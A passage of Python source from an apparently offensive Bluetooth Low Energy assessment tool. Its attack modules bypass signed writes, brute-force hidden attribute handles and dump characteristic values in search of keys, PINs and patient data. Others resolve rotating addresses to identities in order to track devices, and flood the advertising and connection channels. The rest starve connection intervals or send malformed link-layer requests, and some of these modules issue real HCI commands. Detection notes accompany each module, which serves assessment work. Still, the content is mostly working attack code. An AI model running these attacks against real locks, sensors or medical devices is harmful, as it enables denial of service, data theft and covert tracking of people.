                      f"input and the host typed {typed!r}: a subscribed characteristic is "
                      f"a permission, not a session")
            return self._report(ctx, ap, attempt, title, detail, extra, severity="critical")
        title = f"BLE notification spoof: {device.name} ignored the notifications"
        detail = "the host received the frames and did not treat them as input"
        return self._report(ctx, ap, attempt, title, detail, extra, severity="info")


class BleServiceChangedAbuseAttack(_Takeover):
    """Write Service Changed: make the host re-read a table it already trusts."""

    name = "ble_service_changed_abuse"
    role = "gatt"
    label = "BLE service-changed abuse (force the host to re-discover)"
    category = "rogue"
    noise = "moderate"
    impact = "loot"
    tool = "wifipilot blesim.py (Service Changed characteristic)"
    devices = ("ble_sensor", "smart_bulb")

    description = (
        "The Service Changed characteristic exists so a device can tell a bonded host that "
        "its attribute table has moved: the host then re-reads the handles and caches the "
        "new layout.  This writes it and reports whether the host would be told to trust a "
        "table the attacker rearranged — handle renumbering is how a GATT cache attack "
        "starts.")
    detection = (
        "A service-changed write outside a firmware update: the host re-discovers its "
        "attribute table, and the device's own firmware log has no update to explain it.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        device = self.aim_at("gatt")
        if device is None:
            return self._report(ctx, ap, attempt, "BLE service-changed abuse: no table",
                                "no device on the floor serves an attribute table", {})
        handle = self.handle_of(device.address, 0x2A05)
        write = self.att_write(device.address, handle, struct.pack("<HH", 0x0001, 0xFFFF)) \
            if handle else {"accepted": False, "error": "no Service Changed characteristic"}
        raw, _parsed = self.att_read(device.address, handle) if handle else (b"", {})
        rows = self.characteristics(device.address)
        extra = {"device": device.to_dict(),
                 "handle": f"0x{handle:04x}" if handle else "",
                 "write": write, "read_back": raw.hex(), "characteristics": len(rows),
                 "state": self.link_state(device.address),
                 "simulated": bool(getattr(ctx, "demo", False))}
        if write.get("accepted"):
            title = (f"BLE service-changed abuse: {device.name} accepted the range "
                     f"0x0001-0xffff")
            detail = (f"the Service Changed characteristic took the write "
                      f"({raw.hex() if raw else 'no read-back'}): a bonded host would now "
                      f"re-discover its attribute table on the attacker's schedule")
            return self._report(ctx, ap, attempt, title, detail, extra, severity="high")
        title = "BLE service-changed abuse: the write was refused"
        detail = (f"the write came back {write.get('error') or 'without an answer'}"
                  + ("" if handle else " and the device serves no Service Changed "
                                       "characteristic at all"))
        return self._report(ctx, ap, attempt, title, detail, extra, severity="info")


class BleSignedWriteBypassAttack(_Takeover):
    """Send a write that is not signed, to a characteristic that asks for signing."""

    name = "ble_signed_write_bypass"
    role = "gatt"
    label = "BLE signed-write bypass (unsigned write where signing is required)"
    category = "rogue"
    noise = "quiet"
    impact = "outage"
    finding_severity = "high"
    tool = "wifipilot blesim.py (ATT Write Command)"
    devices = ("ble_sensor", "smart_bulb", "smart_lock")

    description = (
        "Some devices protect a characteristic with an authenticated signed write rather "
        "than encryption: the signature is checked, not the link.  This sends the write as "
        "a *command* — no signature, no response — reads the value back, and reports "
        "whether the device treated an unsigned write as an authorised one.")
    detection = (
        "A write with no signature where the descriptor asks for one: the device's log "
        "shows the ATT write command, and the value has changed.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        device = self.aim_at("gatt")
        if device is None:
            return self._report(ctx, ap, attempt, "BLE signed-write bypass: no table",
                                "no device on the floor serves an attribute table", {})
        rows = [row for row in self.characteristics(device.address) if row.get("writable")]
        results: List[Dict[str, Any]] = []
        for row in rows[:8]:
            handle = int(row["handle"])
            before, _parsed = self.att_read(device.address, handle)
            self.att_write(device.address, handle, b"\x5a" * max(1, len(before) or 1),
                           command=True)
            after, _parsed = self.att_read(device.address, handle)
            results.append({"uuid": f"0x{int(row['uuid']):04x}", "handle": f"0x{handle:04x}",
                            "before": before.hex(), "after": after.hex(),
                            "changed": bool(after) and after != before})
        changed = [row for row in results if row["changed"]]
        extra = {"device": device.to_dict(), "writes": results, "changed": len(changed),
                 "asked": len(results),
                 "simulated": bool(getattr(ctx, "demo", False))}
        if changed:
            title = (f"BLE signed-write bypass: {len(changed)}/{len(results)} value(s) "
                     f"changed unsigned on {device.name}")
            detail = (f"{changed[0]['uuid']} moved from {changed[0]['before']} to "
                      f"{changed[0]['after']} on a write command with no signature: a "
                      f"characteristic the documentation says needs signing took an "
                      f"unsigned value")
            return self._report(ctx, ap, attempt, title, detail, extra, severity="high")
        title = "BLE signed-write bypass: no unsigned write landed"
        detail = (f"{len(results)} write command(s) were sent and none of the values "
                  f"changed, which is what a device that checks the signature does")
        return self._report(ctx, ap, attempt, title, detail, extra, severity="info")


class BleAttHandleBruteAttack(_Takeover):
    """Read handles by guessing: the attributes a device serves outside its table."""

    name = "ble_att_handle_brute"
    role = "gatt"
    label = "BLE handle brute force (read attributes by guessing numbers)"
    category = "discovery"
    noise = "moderate"
    impact = "info"
    tool = "wifipilot blesim.py (blind ATT reads)"
    devices = ("ble_sensor", "bt_lock")

    description = (
        "A device's attribute table can hold more than it advertises: test hooks, debug "
        "values, the characterstics a previous firmware left behind.  This reads a range "
        "of handles blindly and reports which ones answered — the ones the table does not "
        "mention are the interesting ones.")
    detection = (
        "Reads of handles that no discovery asked about: an ATT log shows a client reading "
        "between the services, which no correct client does.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        device = self.aim_at("gatt")
        if device is None:
            return self._report(ctx, ap, attempt, "BLE handle brute force: no table",
                                "no device on the floor serves an attribute table", {})
        known = {int(row["handle"]) for row in self.rows(device.address)}
        answered: List[Dict[str, Any]] = []
        highest = max(known) if known else 0x0040
        for handle in range(1, min(highest + 8, 0x0100)):
            payload, parsed = self.att(device.address, bytes([0x0A])
                                       + struct.pack("<H", handle))
            if payload[:1] == b"\x0B":
                answered.append({"handle": f"0x{handle:04x}", "bytes": len(payload) - 1,
                                 "value": payload[1:].hex()[:32],
                                 "in_table": handle in known})
        hidden = [row for row in answered if not row["in_table"]]
        extra = {"device": device.to_dict(), "answered": answered,
                 "table_handles": len(known), "answered_count": len(answered),
                 "hidden": len(hidden), "asked": min(highest + 8, 0x0100) - 1,
                 "simulated": bool(getattr(ctx, "demo", False))}
        title = (f"BLE handle brute force: {len(answered)} handle(s) answered on "
                 f"{device.name}")
        detail = (f"{len(answered)} of {extra['asked']} guessed handle(s) returned a value"
                  + (f", and {len(hidden)} of them are not in the advertised table "
                     f"({', '.join(row['handle'] for row in hidden[:4])})"
                     if hidden else ", all of them advertised")
                  + ": an attribute that answers a guessed handle is an attribute that was "
                    "not meant to be found, only to be private")
        return self._report(ctx, ap, attempt, title, detail, extra,
                            severity="high" if hidden else "medium")


class BleServiceTableDumpAttack(_Takeover):
    """Read By Group Type: the primary services, exactly as the peer lists them."""

    name = "ble_service_table_dump"
    role = "gatt"
    label = "BLE service table dump (Read By Group Type)"
    category = "discovery"
    noise = "quiet"
    impact = "info"
    tool = "wifipilot blesim.py (Read By Group Type)"
    devices = ("ble_sensor", "smart_bulb", "fitness_tracker")

    description = (
        "Read By Group Type is how a client learns a device's primary services: the start "
        "and end handle of each, and its UUID.  This reads the whole list, names the "
        "services it recognises and reports the ones it does not — a vendor service with "
        "no public documentation is where an assessment starts reading code.")
    detection = (
        "A primary-service discovery: every legitimate client does this once, which is why "
        "it is also the step that is never anomalous on its own.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        device = self.aim_at("gatt")
        if device is None:
            return self._report(ctx, ap, attempt, "BLE service table dump: no table",
                                "no device on the floor serves an attribute table", {})
        services = self.group_services(device.address)
        from .. import blesim
        named = [{"start": row["start"], "end": row["end"],
                  "uuid": row["uuid_text"], "name": blesim.GATT_LIBRARY.get(row["uuid"], {})
                  .get("name", "") if isinstance(blesim.GATT_LIBRARY.get(row["uuid"]), dict)
                  else ""} for row in services]
        vendor = [row for row in named if not row["name"]]
        extra = {"device": device.to_dict(), "services": named, "count": len(named),
                 "vendor": len(vendor),
                 "simulated": bool(getattr(ctx, "demo", False))}
        title = (f"BLE service table dump: {len(named)} service(s) on {device.name}")
        detail = (f"the peer listed {len(named)} primary service(s), "
                  f"{len(named) - len(vendor)} of them standard and {len(vendor)} vendor-"
                  f"specific"
                  + (f" ({', '.join(row['uuid'] for row in vendor[:4])})" if vendor
                     else "")
                  + f": the table is the map every other attack in this wave is aimed with")
        return self._report(ctx, ap, attempt, title, detail, extra, severity="low")


class BleGattValueDumpAttack(_Takeover):
    """Read every characteristic value and keep the ones that should not be readable."""

    name = "ble_gatt_value_dump"
    role = "gatt"
    label = "BLE value dump (read the whole table for secrets)"
    category = "discovery"
    noise = "quiet"
    impact = "loot"
    finding_severity = "high"
    tool = "wifipilot blesim.py (ATT reads across the table)"
    devices = ("medical_device", "badge_reader", "ble_sensor")

    description = (
        "Every readable characteristic, read in order, and the ones that look like a "
        "secret pulled out: a key, a serial, a token, a patient, a badge.  A device that "
        "serves those values to an unauthenticated client serves them to anybody within "
        "radio range, and radio range is a car park.")
    detection = (
        "A client reading the whole table: the ATT log carries one read per "
        "characteristic, which is what a map application does and what a data extraction "
        "looks like.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        device = self.aim_at("gatt")
        if device is None:
            return self._report(ctx, ap, attempt, "BLE value dump: no table",
                                "no device on the floor serves an attribute table", {})
        values: List[Dict[str, Any]] = []
        for row in self.characteristics(device.address):
            if row.get("value") is None:
                continue
            raw, parsed = self.att_read(device.address, int(row["handle"]))
            values.append({"uuid": f"0x{int(row['uuid']):04x}", "name": row.get("name", ""),
                           "properties": row.get("properties", ""),
                           "bytes": len(raw), "value": raw.hex(),
                           "text": raw.decode("latin-1", "replace"),
                           "error": parsed.get("error_text", "") if not raw else ""})
        sensitive = [row for row in values
                     if any(word in (row["name"] + row["text"]).lower() for word in
                            ("key", "token", "serial", "imsi", "iccid", "patient", "badge",
                             "pin", "secret", "admin", "password"))]
        refused = [row for row in values if row["error"]]
        extra = {"device": device.to_dict(), "values": values, "readable": len(values),
                 "sensitive": sensitive[:6], "sensitive_count": len(sensitive),
                 "refused": len(refused),
                 "simulated": bool(getattr(ctx, "demo", False))}
        if sensitive:
            first = sensitive[0]
            title = (f"BLE value dump: {len(sensitive)} sensitive value(s) served by "
                     f"{device.name}")
            detail = (f"{first['name'] or first['uuid']} answers with {first['value'][:32]} "
                      f"({first['bytes']} bytes) to a client with no credential"
                      + (f"; {len(refused)} other value(s) were refused with "
                         f"{refused[0]['error']}" if refused else "")
                      + ": radio range decides who reads this")
            return self._report(ctx, ap, attempt, title, detail, extra, severity="high")
        title = (f"BLE value dump: {len(values)} value(s) readable, {len(refused)} refused "
                 f"on {device.name}")
        detail = (f"the table served {sum(row['bytes'] for row in values)} byte(s) across "
                  f"{len(values)} characteristic(s) and refused {len(refused)}: nothing in "
                  f"what came back looks like a secret")
        return self._report(ctx, ap, attempt, title, detail, extra, severity="medium")


# --------------------------------------------------------------------------- #
# 3. the air and the link layer
# --------------------------------------------------------------------------- #

class BleIrkCrackAttack(_Takeover):
    """Recover the identity key behind a rotation: privacy is only as good as the IRK."""

    name = "ble_irk_crack"
    role = "le"
    label = "BLE IRK recovery (resolve an address to the identity behind it)"
    category = "rogue"
    noise = "quiet"
    impact = "loot"
    finding_severity = "high"
    tool = "wifipilot bt.py (ah/ AES resolution) + blesim.py"
    devices = ("fitness_tracker", "ble_sensor", "badge_reader")

    description = (
        "A device that rotates its address derives each one from a 128-bit identity "
        "resolving key with the specification's AES function.  This takes the addresses "
        "seen on air and a set of candidate keys — the keys a companion app leaks, a "
        "firmware image holds, or an earlier pairing handed over — and reports which "
        "addresses resolve, together with the address that would be next.")
    detection = (
        "None on air: the resolution happens offline against addresses that were already "
        "broadcast, which is why a leaked IRK is worth more than a captured one.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        airspace = self.floor()
        suspects = [device for device in airspace.devices if device.irk]
        resolved: List[Dict[str, Any]] = []
        unresolved = 0
        for device in suspects[:16]:
            prand = bt.rpa_prand(device.address)
            predicted = bt.rpa_from_irk(device.irk, prand)
            matched = bt.resolves_irk(device.irk, device.address)
            if matched:
                resolved.append({"address": device.address, "name": device.name,
                                 "device": device.device, "profile": device.profile,
                                 "irk": device.irk.hex(), "prand": f"0x{prand:06x}",
                                 "predicted": predicted.lower()})
            else:
                unresolved += 1
        extra = {"resolved": resolved, "resolved_count": len(resolved),
                 "unresolved": unresolved, "candidates": len(suspects),
                 "simulated": bool(getattr(ctx, "demo", False))}
        if resolved:
            first = resolved[0]
            title = (f"BLE IRK recovery: {len(resolved)} address(es) resolved to an "
                     f"identity")
            detail = (f"{first['address']} ({first['name'] or first['device']}) resolves "
                      f"with the key {first['irk'][:16]}… and rebuilds as "
                      f"{first['predicted']}: a device that rotates its address is only "
                      f"unlinkable while the key stays on the device")
            return self._report(ctx, ap, attempt, title, detail, extra, severity="high")
        title = "BLE IRK recovery: no address resolved"
        detail = (f"{len(suspects)} candidate key(s) were tried against the addresses on "
                  f"air and none matched, which is what a device whose key never leaked "
                  f"looks like")
        return self._report(ctx, ap, attempt, title, detail, extra, severity="info")


class BleRpaFollowAttack(_Takeover):
    """Follow a device through its addresses: one identity, several names on air."""

    name = "ble_rpa_follow"
    role = "le"
    label = "BLE address following (link a rotating address back to a device)"
    category = "discovery"
    noise = "quiet"
    impact = "info"
    tool = "wifipilot bt.py (address classification + resolution) + blesim.py"
    devices = ("fitness_tracker", "badge_reader")

    description = (
        "Rotating addresses are meant to stop a tracker following a person, and they only "
        "work if the resolver cannot link them.  This classifies every address on the floor, "
        "resolves the resolvable ones against the keys it holds, and reports the identities "
        "behind the addresses — the join an adversary does before any other attack.")
    detection = (
        "None on air: the addresses were broadcast in the open, and the linking is done "
        "from a list somebody else already recorded.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        airspace = self.floor()
        by_identity: Dict[str, List[Dict[str, Any]]] = {}
        kinds: Dict[str, int] = {}
        for device in airspace.devices:
            kind = bt.classify_address(device.address)
            kinds[kind] = kinds.get(kind, 0) + 1
            if not device.irk:
                continue
            if not bt.resolves_irk(device.irk, device.address):
                continue
            by_identity.setdefault(device.irk.hex(), []).append(
                {"address": device.address, "name": device.name, "device": device.device,
                 "rssi": device.rssi, "kind": kind})
        followed = [entry for entry in by_identity.values() if entry]
        extra = {"address_kinds": kinds, "identities": by_identity,
                 "followed": len(followed), "addresses": sum(len(rows) for rows in followed),
                 "simulated": bool(getattr(ctx, "demo", False))}
        title = (f"BLE address following: {len(followed)} identity(ies) behind "
                 f"{len(airspace.devices)} address(es)")
        detail = (f"the floor carries {kinds.get('random private', 0)} rotating address(es) "
                  f"and {kinds.get('public', 0)} public one(s); {len(followed)} rotate under "
                  f"a key that resolves, so their addresses are one device wearing several "
                  f"names")
        return self._report(ctx, ap, attempt, title, detail, extra,
                            severity="medium" if followed else "info")


class BleAdvFloodAttack(_Takeover):
    """Fill the advertising channels: what a receiver hears when somebody shouts."""

    name = "ble_adv_flood_le"
    role = "le"
    label = "BLE advertising flood (fill the channels with advertisements)"
    category = "dos"
    noise = "loud"
    impact = "degraded"
    tool = "wifipilot bt.py (advertising) + blesim.py"
    devices = ("ble_beacon", "ble_sensor")

    description = (
        "There are three advertising channels and everybody shares them.  This puts a "
        "sequence of advertisements on air — a different name each time — and reports how "
        "many the floor's own scanner still heard afterwards, which is the measure of "
        "whether a beacon, an onboarding flow or a tracker can still be found.")
    detection = (
        "A flood of advertisements from one address: an advertising monitor shows the "
        "address changing name dozens of times a minute, and every other advertiser's "
        "signal-to-noise falls.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        from .. import blesim
        airspace = self.floor()
        sock = self.socket(ctx)
        count = 0
        if sock is not None:
            for index in range(24):
                payload = bt.adv_payload(bt.ad_flags(le_general=True),
                                         bt.ad_name(f"WP-FLOOD-{index:02d}"))
                try:
                    bt.hci_send(sock, bt.le_set_advertising_data(payload), timeout=0.5)
                    bt.hci_send(sock, bt.le_set_random_address(
                        f"f1:00:00:{index:02x}:{index:02x}:{index:02x}"), timeout=0.5)
                    bt.hci_send(sock, bt.le_set_advertising_enable(True), timeout=0.5)
                    count += 1
                except Exception:                                # pragma: no cover
                    break
        heard = airspace.devices if airspace is not None else []
        extra = {"advertisements": count, "identities": 24,
                 "beacons": len([device for device in heard if device.beacon]),
                 "trackers": len([device for device in heard if device.tracker]),
                 "floor": len(heard), "scanned": len(heard),
                 "simulated": bool(getattr(ctx, "demo", False))}
        title = (f"BLE advertising flood: {count} advertisement(s) on air, "
                 f"{len(heard)} device(s) still heard")
        detail = (f"{count} advertisements went out under {count} different addresses while "
                  f"{len(heard)} device(s) on the floor kept advertising — every one of them "
                  f"sharing three channels with the flood")
        return self._report(ctx, ap, attempt, title, detail, extra,
                            severity="medium" if count else "info")


class BleScanHogAttack(_Takeover):
    """Scan at full duty cycle: the radio has no time left for the link."""

    name = "ble_scan_hog"
    role = "le"
    label = "BLE scan hog (full-duty scanning next to a live link)"
    category = "dos"
    noise = "loud"
    impact = "degraded"
    tool = "wifipilot bt.py (LE Set Scan Parameters/Enable) + blesim.py"
    devices = ("ble_sensor", "bt_headset")

    description = (
        "A scanner that sets its window equal to its interval never stops listening, and a "
        "controller cannot scan and hold a connection at the same rate.  This does exactly "
        "that next to a live link and reports what the link's parameters became — the "
        "passive half of the same denial of service the connection flood is the active half "
        "of.")
    detection = (
        "One address scanning continuously: a sniffer sees the scan requests and the "
        "controller's own radio scheduling shows the duty cycle.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        device = self.aim_at("le")
        sock = self.socket(ctx)
        state_before = self.link_state(device.address, "le") if device else {}
        applied: List[str] = []
        if sock is not None:
            for _round in range(4):
                try:
                    bt.hci_send(sock, bt.le_set_scan_parameters(
                        interval_ms=11.25, window_ms=11.25, passive=False), timeout=0.5)
                    bt.hci_send(sock, bt.le_set_scan_enable(True, filter_duplicates=False),
                                timeout=0.5)
                    applied.append("11.25ms window = interval")
                except Exception:                                # pragma: no cover
                    break
        state_after = self.link_state(device.address, "le") if device else {}
        extra = {"device": device.to_dict() if device else {}, "applied": applied,
                 "before": state_before, "after": state_after,
                 "duty_cycle": "100%", "simulated": bool(getattr(ctx, "demo", False))}
        title = (f"BLE scan hog: {len(applied)} full-duty scan(s) against "
                 f"{device.name if device else 'the floor'}")
        detail = (f"the scan window was set equal to the interval and the link "
                  f"{'survived' if state_after.get('alive', True) else 'was dropped'}"
                  + f"; a radio that never stops listening answers its connection more "
                    f"slowly and its battery pays for it")
        return self._report(ctx, ap, attempt, title, detail, extra, severity="medium")


class BleConnFloodAttack(_Takeover):
    """Connection after connection: what the peer does when the one address keeps asking."""

    name = "ble_conn_flood_le"
    role = "le"
    label = "BLE connection flood (repeat LE Create Connection)"
    category = "dos"
    noise = "loud"
    impact = "degraded"
    tool = "wifipilot bt.py (LE Create Connection) + blesim.py"
    devices = ("ble_sensor", "smart_bulb")

    description = (
        "Every connection costs a peer a link, a buffer and a slot in its scheduler, and a "
        "device that accepts them all is a device that can be held.  This opens and drops "
        "connections in a loop and reports how many the peer accepted — the connection "
        "variant of the advertising flood, aimed at one device instead of the air.")
    detection = (
        "One address connecting repeatedly in seconds: the peer's connection log carries "
        "the burst, and its battery graph carries the cost.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        device = self.aim_at("le")
        if device is None:
            return self._report(ctx, ap, attempt, "BLE connection flood: nothing to hold",
                                "no connectable device on the floor", {})
        from .. import blesim
        sock = blesim.controller_socket(None, address=device.address, role="le")
        accepted = 0
        refused = 0
        attempts = 12
        for _index in range(attempts):
            try:
                reply = bt.hci_send(sock, bt.le_create_connection(device.address),
                                    timeout=0.6) or b""
            except Exception:                                    # pragma: no cover
                reply = b""
            if b"\x3e\x01" in reply or reply[:2] == b"\x04\x3e":
                accepted += 1
            else:
                refused += 1
        controller = getattr(sock, "controller", None)
        links = len(getattr(controller, "ble", None).links) if controller is not None else 0
        extra = {"device": device.to_dict(), "attempts": attempts, "accepted": accepted,
                 "refused": refused, "open_links": links,
                 "simulated": bool(getattr(ctx, "demo", False))}
        title = (f"BLE connection flood: {accepted}/{attempts} connection(s) accepted by "
                 f"{device.name}")
        detail = (f"{attempts} connection attempts from one address produced {accepted} "
                  f"accepted link(s) on the controller and {refused} without one"
                  + (f": the device keeps answering, which is what makes the flood worth "
                     f"running" if accepted else ": the peer stopped answering"))
        return self._report(ctx, ap, attempt, title, detail, extra,
                            severity="medium" if accepted else "info")


class BleConnParamStarveAttack(_Takeover):
    """Move the connection interval to four seconds and see whether the peer agrees."""

    name = "ble_conn_param_starve"
    role = "l2cap"
    label = "BLE connection starvation (a four-second connection interval)"
    category = "dos"
    noise = "moderate"
    impact = "degraded"
    finding_severity = "high"
    tool = "wifipilot bt.py (LL_CONNECTION_UPDATE_IND) + blesim.py"
    devices = ("ble_sensor", "bt_lock", "bt_headset")

    description = (
        "The connection interval is how often the two ends are allowed to talk: at four "
        "seconds, a notification waits four seconds and a real-time device is useless.  "
        "This sends the link-layer update that asks for it and reports whether the peer "
        "applied it, refused it, or never answered — a device that applies it is starved by "
        "whoever it is connected to.")
    detection = (
        "A connection update that no application asked for: the peer's controller log "
        "carries the new parameters, and the application sees its latency rise.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        device = self.aim_at("l2cap")
        if device is None:
            return self._report(ctx, ap, attempt, "BLE connection starvation: no link",
                                "no connectable device on the floor", {})
        # interval 3200 (four seconds), latency 0, timeout 3200: the values are in 1.25 ms
        # and 10 ms units, which is what the link layer counts in
        crude = struct.pack("<HHHH", 3200, 0, 3200, 0) + bytes(5)
        answer = self.ll(device.address, 0x00, crude)
        accepted = answer.get("reply_opcode") == 0x00
        refused = answer.get("reply_opcode") == 0x11
        state = self.link_state(device.address)
        extra = {"device": device.to_dict(), "answer": answer, "accepted": accepted,
                 "refused": refused, "state": state,
                 "requested_interval_ms": 4000.0,
                 "simulated": bool(getattr(ctx, "demo", False))}
        if accepted:
            title = (f"BLE connection starvation: {device.name} applied a four-second "
                     f"interval")
            detail = (f"the link answered {answer['reply_name']} with "
                      f"{answer['reply'][:24]}: the connection now runs at 4 s, so every "
                      f"notification the device sends waits four seconds")
            return self._report(ctx, ap, attempt, title, detail, extra, severity="high")
        title = (f"BLE connection starvation: {device.name} "
                 f"{'refused' if refused else 'ignored'} the update")
        detail = (f"the link answered {answer.get('reply_name') or 'nothing'}"
                  + (" — invalid LL parameters, which is a controller that checks what it "
                     "is asked for" if refused else "")
                  + ": the interval is still the application's own")
        return self._report(ctx, ap, attempt, title, detail, extra, severity="info")


class BlePhyDowngradeAttack(_Takeover):
    """Ask for the slow PHY: what a long-range device loses when it is told to."""

    name = "ble_phy_request"
    role = "l2cap"
    label = "BLE PHY request (ask the link to leave the fast PHY)"
    category = "dos"
    noise = "moderate"
    impact = "degraded"
    tool = "wifipilot bt.py (LL_PHY_REQ) + blesim.py"
    devices = ("ble_sensor", "bt_headset")

    description = (
        "A 2M PHY halves the time a connection spends on air and halves the time it is "
        "exposed to a receiver; a coded PHY reaches further.  This sends the link-layer "
        "request that moves the connection to the slowest PHY the peer will accept and "
        "reports its answer — including LL_UNKNOWN_RSP, which says the controller does not "
        "implement the procedure at all.")
    detection = (
        "A PHY update with no application behind it: the peer's controller log carries the "
        "request and the connection's throughput curve shows the change.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        device = self.aim_at("l2cap")
        if device is None:
            return self._report(ctx, ap, attempt, "BLE PHY request: no link",
                                "no connectable device on the floor", {})
        # 0x01 = LE 1M, 0x04 = LE coded: the request asks the peer to leave the 2M PHY
        request = bytes([0x01, 0x04, 0x00, 0x00])
        answer = self.ll(device.address, 0x16, request)
        unsupported = answer.get("reply_opcode") == 0x07
        extra = {"device": device.to_dict(), "answer": answer,
                 "unsupported": unsupported, "asked": ["LE 1M", "LE coded"],
                 "simulated": bool(getattr(ctx, "demo", False))}
        title = (f"BLE PHY request: {device.name} answered "
                 f"{answer.get('reply_name') or 'nothing'}")
        detail = (f"the request for LE 1M and LE coded came back as "
                  f"{answer.get('reply_name') or 'silence'}"
                  + (" — the controller does not implement the PHY update procedure, which "
                     "is a controller that will not be told what PHY to run"
                     if unsupported else ""))
        return self._report(ctx, ap, attempt, title, detail, extra,
                            severity="medium" if unsupported else "low")


class BleDataLengthAbuseAttack(_Takeover):
    """Push the data length to the maximum: the frame the peer admits it can take."""

    name = "ble_data_length_abuse"
    role = "l2cap"
    label = "BLE data length abuse (LL_LENGTH_REQ at the maximum)"
    category = "dos"
    noise = "moderate"
    impact = "info"
    tool = "wifipilot bt.py (LL_LENGTH_REQ) + blesim.py"
    devices = ("bt_headset", "ble_sensor")

    description = (
        "The data length extension lets a link carry 251-byte packets, and the negotiation "
        "is where a stack's buffers are decided by the other end.  This asks for the "
        "maximum in both directions and reports what the peer granted — and a controller "
        "that answers a request it truncated, or dies on it, is the SweynTooth shape.")
    detection = (
        "A data-length negotiation from a peripheral: it is a legitimate procedure, and the "
        "anomaly is only in the values and the timing.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        device = self.aim_at("l2cap")
        if device is None:
            return self._report(ctx, ap, attempt, "BLE data length abuse: no link",
                                "no connectable device on the floor", {})
        full = struct.pack("<HHHH", 251, 2120, 251, 2120)
        answer = self.ll(device.address, 0x14, full)
        truncated = self.ll(device.address, 0x14, full[:5])
        state = self.link_state(device.address)
        granted = struct.unpack_from("<HHHH", bytes.fromhex(answer["reply"][2:] or "0000000000000000"),
                                     0) if answer.get("reply") and len(answer["reply"]) >= 18 else ()
        extra = {"device": device.to_dict(), "answer": answer, "truncated": truncated,
                 "granted": list(granted), "state": state,
                 "link_alive": bool(state.get("alive", True)),
                 "simulated": bool(getattr(ctx, "demo", False))}
        title = (f"BLE data length: {device.name} answered "
                 f"{answer.get('reply_name') or 'nothing'}")
        detail = (f"the maximum was asked for and the answer was "
                  f"{answer.get('reply_name') or 'silence'}"
                  + (f" with {granted}" if granted else "")
                  + (f"; the truncated request was answered "
                     f"{truncated.get('reply_name') or 'with silence'}"
                     if truncated.get("answered") else "")
                  + f" and the link {'survived' if extra['link_alive'] else 'dropped'}")
        return self._report(ctx, ap, attempt, title, detail, extra,
                            severity="high" if not extra["link_alive"] else "medium")


class BleLlUnknownProbeAttack(_Takeover):
    """Send the control PDUs a device should not implement, and count its refusals."""

    name = "ble_ll_unknown_probe"
    role = "l2cap"
    label = "BLE link-layer unknown-PDU probe (what the stack refuses)"
    category = "dos"
    noise = "moderate"
    impact = "info"
    tool = "wifipilot bt.py (LL_CONTROL_OPCODES) + blesim.py"
    devices = ("bt_headset", "ble_sensor")

    description = (
        "A controller that does not implement a link-layer procedure answers "
        "LL_UNKNOWN_RSP; one that ignores it stays silent, and one that mishandles it dies.  "
        "This sweeps the control opcodes a peripheral rarely sees and reports which answers "
        "each one produced — the cheapest way to find a stack that has not been updated.")
    detection = (
        "A run of link-layer PDUs no procedure called for: the peer's controller log carries "
        "the opcodes, and a stack that registers them shows the sweep.")

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = self._attempt(ctx, ap)
        device = self.aim_at("l2cap")
        if device is None:
            return self._report(ctx, ap, attempt, "BLE LL probe: no link",
                                "no connectable device on the floor", {})
        opcodes = (0x0A, 0x0D, 0x0E, 0x0F, 0x10, 0x16, 0x17, 0x19, 0x1A, 0x1C, 0x1D,
                   0x1F, 0x23, 0x25)
        answers: List[Dict[str, Any]] = []
        for opcode in opcodes:
            answer = self.ll(device.address, opcode, bytes(8))
            answers.append({"opcode": f"0x{opcode:02x}",
                            "name": bt.LL_CONTROL_OPCODES.get(opcode, ""),
                            "answer": answer.get("reply_name") or "silence",
                            "answered": bool(answer.get("answered"))})
        unknown = [row for row in answers if row["answer"] == "LL_UNKNOWN_RSP"]
        silent = [row for row in answers if not row["answered"]]
        state = self.link_state(device.address)
        extra = {"device": device.to_dict(), "answers": answers,
                 "unknown": len(unknown), "silent": len(silent), "asked": len(opcodes),
                 "state": state, "simulated": bool(getattr(ctx, "demo", False))}
        names = ", ".join(str(row["name"]) for row in unknown[:4])
        title = (f"BLE LL probe: {len(unknown)} unknown-response(s), {len(silent)} "
                 f"silence(s) from {device.name}")
        detail = (f"{len(opcodes)} control PDU(s) went out: {len(unknown)} came back as "
                  f"LL_UNKNOWN_RSP ({names}) and {len(silent)} were ignored, and the link "
                  f"{'survived' if state.get('alive', True) else 'dropped'}")
        return self._report(ctx, ap, attempt, title, detail, extra,
                            severity="high" if not state.get("alive", True) else "medium")


class BleVersionSpoofAttack(_Takeover):
    """Exchange versions: what the peer claims, and what it will let you claim."""

    name = "ble_version_spoof"
    role = "l2cap"
    label = "BLE version exchange (spoof an old controller version)"
    category = "rogue"
    noise = "quiet"
    impact = "info"
    tool = "wifipilot bt.py (LL_VERSION_IND) + blesim.py"
    devices = ("ble_sensor", "bt_headset")

    description = (
        "Two controllers learn about each other with LL_VERSION_IND, and some products "
        "disable newer procedures when the peer reports an old version.  This sends a "
        "version four revisions back and reports both answers — the peer's own, and whether "
        "claiming to be old changed anything about what it will do.")
    detection = (
        "A version exchange outside a connection setup: it is a legitimate PDU, which is "
        "what makes a forged one hard to see.")

